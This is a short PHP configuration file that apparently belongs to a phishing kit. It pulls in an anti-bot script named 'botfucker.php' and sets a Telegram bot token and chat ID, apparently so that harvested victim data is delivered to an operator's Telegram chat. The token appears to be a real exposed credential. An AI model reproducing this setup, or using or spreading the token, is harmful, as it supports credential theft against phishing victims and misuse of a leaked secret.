

<?php
include './CRfiles/PHP/botfucker.php';

$coronamail = "";

    $coronatoken = "1900956727:AAHEk81s5ZHuFSD0kGvNZEr6bTTv-ttON_0";
    $coronachat = "-628439401";


 ?>